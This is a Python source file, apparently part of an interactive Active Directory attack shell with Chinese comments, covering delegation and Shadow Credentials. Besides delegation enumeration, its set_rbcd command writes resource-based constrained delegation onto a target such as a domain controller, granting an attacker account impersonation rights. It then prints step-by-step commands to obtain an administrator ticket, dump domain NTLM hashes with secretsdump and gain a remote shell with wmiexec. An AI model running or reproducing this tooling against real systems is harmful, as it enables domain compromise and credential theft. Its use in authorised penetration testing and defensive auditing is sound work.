#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Delegation Mixin — 委派 + Shadow Credentials 命令 (6 个)
包含 RBCD、非约束委派、约束委派、Shadow Credentials 等高级利用功能。
"""

import ldap3

from utils.ui import print_info, print_success, print_warn, print_found, print_error
from utils.helpers import (
    parse_args, check_result, get_entry,
    create_empty_sd, create_allow_ace,
    paged_search,
)
from impacket.ldap import ldaptypes


class DelegationMixin:
    """Delegation / BloodHound 命令集"""

    # ═══════════════════════════════════════════════════════════
    #  委派发现
    # ═══════════════════════════════════════════════════════════

    # ── find_delegation ───────────────────────────────────────
    def do_find_delegation(self, line):
        """find_delegation [object] — 全域委派审计 (无参数) / 单对象详情 (带参数)"""
        if line.strip():
            self._delegation_detail(line.strip())
        else:
            self._delegation_audit()

    def _delegation_audit(self):
        """全域委派对象审计 — 非约束 / 约束 / RBCD"""
        print_info("Auditing all delegation objects...")

        rows = []

        # 1) 非约束委派
        seen = set()
        for obj_filter in ['(objectClass=computer)', '(&(objectClass=user)(!(objectClass=computer)))']:
            entries = paged_search(
                self.client, self.domain_dumper.root,
                '(&%s(userAccountControl:1.2.840.113556.1.4.803:=524288))' % obj_filter,
                attributes=['sAMAccountName'],
            )
            for entry in entries:
                sam = entry['sAMAccountName'].value
                if sam not in seen:
                    seen.add(sam)
                    rows.append([sam, 'Unconstrained', 'N/A'])

        # 2) 约束委派
        entries = paged_search(
            self.client, self.domain_dumper.root,
            '(msDS-AllowedToDelegateTo=*)',
            attributes=['sAMAccountName', 'msDS-AllowedToDelegateTo'],
        )
        for entry in entries:
            services = entry['msDS-AllowedToDelegateTo'].values
            rows.append([
                entry['sAMAccountName'].value,
                'Constrained',
                ', '.join(services) if services else 'N/A',
            ])

        # 3) RBCD
        entries = paged_search(
            self.client, self.domain_dumper.root,
            '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)',
            attributes=['sAMAccountName', 'msDS-AllowedToActOnBehalfOfOtherIdentity'],
        )
        for entry in entries:
            allowed = []
            try:
                sd_data = entry['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0]
                sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
                for ace in sd['Dacl'].aces:
                    try:
                        sid = ace['Ace']['Sid'].formatCanonical()
                        resolved = self._resolve_sid(sid)
                        allowed.append('%s (%s)' % (resolved, sid) if resolved else sid)
                    except Exception:
                        pass
            except (IndexError, KeyError):
                pass
            if allowed:
                rows.append([
                    entry['sAMAccountName'].value,
                    'RBCD',
                    ', '.join(allowed),
                ])

        if not rows:
            print_warn("No delegation objects found")
            return

        header = ['AccountName', 'DelegationType', 'DelegationRightsTo']
        col_lens = [
            max(len(header[0]), max(len(r[0]) for r in rows)),
            max(len(header[1]), max(len(r[1]) for r in rows)),
            max(len(header[2]), max(len(r[2]) for r in rows)),
        ]
        fmt = ' '.join(['{:<%d}' % w for w in col_lens])

        print()
        print(fmt.format(*header))
        print(' '.join(['-' * w for w in col_lens]))
        for r in rows:
            print(fmt.format(*r))

    def _delegation_detail(self, object_name):
        """单对象委派详情"""
        entry = get_entry(self.client, self.domain_dumper, object_name, [
            'sAMAccountName', 'userAccountControl',
            'msDS-AllowedToDelegateTo', 'msDS-AllowedToActOnBehalfOfOtherIdentity',
        ])
        if not entry:
            raise Exception("Object not found: %s" % object_name)

        uac = entry['userAccountControl'].value or 0
        print_info("Object: %s" % object_name)
        print_info("UAC: 0x%08x" % uac)

        if uac & 0x80000:
            print_warn("UNCONSTRAINED DELEGATION enabled!")
        else:
            print_info("Unconstrained delegation: No")

        if uac & 0x1000000:
            print_warn("TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition) enabled!")

        try:
            services = entry['msDS-AllowedToDelegateTo'].values
            if services:
                print_warn("CONSTRAINED DELEGATION to:")
                for svc in services:
                    print_found("  -> %s" % svc)
        except (KeyError, AttributeError):
            print_info("Constrained delegation: No")

        try:
            sd_data = entry['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0]
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
            print_warn("RBCD configured, allowed actors:")
            for ace in sd['Dacl'].aces:
                try:
                    sid = ace['Ace']['Sid'].formatCanonical()
                    resolved = self._resolve_sid(sid)
                    print_found("  <- %s (%s)" % (resolved, sid) if resolved else "  <- %s" % sid)
                except Exception:
                    pass
        except (IndexError, KeyError):
            print_info("RBCD: Not configured")

    # ── set_rbcd ──────────────────────────────────────────────
    def do_set_rbcd(self, line):
        """set_rbcd <target> <grantee> — 设置 RBCD 委派"""
        args = parse_args(line, 2, 2, "set_rbcd DC01$ ATTACKER$")

        target_name = args[0]
        grantee_name = args[1]

        target = get_entry(self.client, self.domain_dumper, target_name,
                           ['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        if not target:
            raise Exception("Target not found: %s" % target_name)
        print_found("Target DN: %s" % target.entry_dn)

        grantee = get_entry(self.client, self.domain_dumper, grantee_name, ['objectSid'])
        if not grantee:
            raise Exception("Grantee not found: %s" % grantee_name)
        grantee_sid = grantee['objectSid'].value
        print_found("Grantee: %s (%s)" % (grantee_name, grantee_sid))

        try:
            sd_data = target['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0]
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
            for ace in sd['Dacl'].aces:
                try:
                    if ace['Ace']['Sid'].formatCanonical() == str(grantee_sid):
                        print_info("Grantee already has RBCD permission")
                        return
                except Exception:
                    pass
        except (IndexError, KeyError):
            sd = create_empty_sd()

        sd['Dacl'].aces.append(create_allow_ace(str(grantee_sid)))
        self.client.modify(
            target.entry_dn,
            {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
        )
        check_result(self.client, "RBCD set: %s can now impersonate users on %s" % (grantee_name, target_name))

        from utils.helpers import get_domain_name
        domain = get_domain_name(self.domain_dumper.root)
        dc_ip = self.dc_address
        if grantee_name.endswith('$'):
            grantee_spn = '%s.%s' % (grantee_name[:-1], domain)
        else:
            grantee_spn = grantee_name

        if target_name.endswith('$'):
            target_host = '%s.%s' % (target_name[:-1], domain)
        else:
            target_host = '%s.%s' % (target_name, domain)

        print_warn("Exploit Tips:")
        print_found("  1. getST.py -spn cifs/%s '%s/%s:PASSWORD' -impersonate administrator -dc-ip %s" % (
            target_host, domain, grantee_spn, dc_ip))
        print_found("  2. export KRB5CCNAME=administrator.ccache")
        print_found("  3. secretsdump.py -k -no-pass %s@%s -dc-ip %s -just-dc-ntlm" % (
            target_host.split('.')[0] + '$' if not target_name.endswith('$') else target_name,
            target_host, dc_ip))
        print_found("  4. wmiexec.py -k -no-pass administrator@%s" % target_host)

    # ── remove_rbcd (别名: clear_rbcd) ───────────────────────
    def do_remove_rbcd(self, line):
        """remove_rbcd <target> — 移除 RBCD"""
        args = parse_args(line, 1, 1, "remove_rbcd DC01$")

        entry = get_entry(self.client, self.domain_dumper, args[0],
                          ['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        if not entry:
            raise Exception("Target not found: %s" % args[0])

        print_found("Target DN: %s" % entry.entry_dn)

        self.client.modify(
            entry.entry_dn,
            {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_DELETE, []]},
        )
        if self.client.result['result'] == 0:
            print_success("RBCD cleared on %s" % args[0])
        elif self.client.result['result'] == 16:
            print_info("RBCD attribute not present on %s (already clean)" % args[0])
        else:
            print_error("Failed: %s" % self.client.result.get('description', ''))

    do_clear_rbcd = do_remove_rbcd

    # ═══════════════════════════════════════════════════════════
    #  Shadow Credentials
    # ═══════════════════════════════════════════════════════════

    # ── find_shadowcredentials ────────────────────────────────
    def do_find_shadowcredentials(self, line):
        """find_shadowcredentials — 查询可写 msDS-KeyCredentialLink 的对象"""
        print_info("Searching for objects with msDS-KeyCredentialLink...")
        entries = paged_search(
            self.client, self.domain_dumper.root,
            '(msDS-KeyCredentialLink=*)',
            attributes=['sAMAccountName', 'msDS-KeyCredentialLink'],
        )
        if not entries:
            print_warn("No objects with KeyCredentialLink found")
            return

        rows = []
        for entry in entries:
            vals = entry['msDS-KeyCredentialLink'].values
            rows.append([entry['sAMAccountName'].value, str(len(vals) if vals else 0)])

        header = ['AccountName', 'KeyCredentials']
        col_lens = [
            max(len(header[0]), max(len(r[0]) for r in rows)),
            max(len(header[1]), max(len(r[1]) for r in rows)),
        ]
        fmt = ' '.join(['{:<%d}' % w for w in col_lens])

        print()
        print(fmt.format(*header))
        print(' '.join(['-' * w for w in col_lens]))
        for r in rows:
            print(fmt.format(*r))

    # ── add_shadowcredential ──────────────────────────────────
    def do_add_shadowcredential(self, line):
        """
        add_shadowcredential <target> <user>
        创建 Shadow Credential (需要 LDAPS + Windows Server 2016+)
        """
        args = parse_args(line, 2, 3, "add_shadowcredential DC01$ attacker$ [key_b64]")
        print_warn("Shadow Credentials full implementation requires certificate generation.")
        print_warn("Use Whisker (C#) or pywhisker (Python) for full exploitation.")

        target = get_entry(self.client, self.domain_dumper, args[0], [
            'sAMAccountName', 'msDS-KeyCredentialLink',
        ])
        if not target:
            raise Exception("Target not found: %s" % args[0])

        print_info("Target: %s (%s)" % (args[0], target.entry_dn))

    # ── remove_shadowcredential ───────────────────────────────
    def do_remove_shadowcredential(self, line):
        """remove_shadowcredential <target> <user> — 删除 Shadow Credential"""
        args = parse_args(line, 2, 2, "remove_shadowcredential DC01$ attacker$")
        print_warn("Use Whisker/pywhisker to remove specific key credentials.")
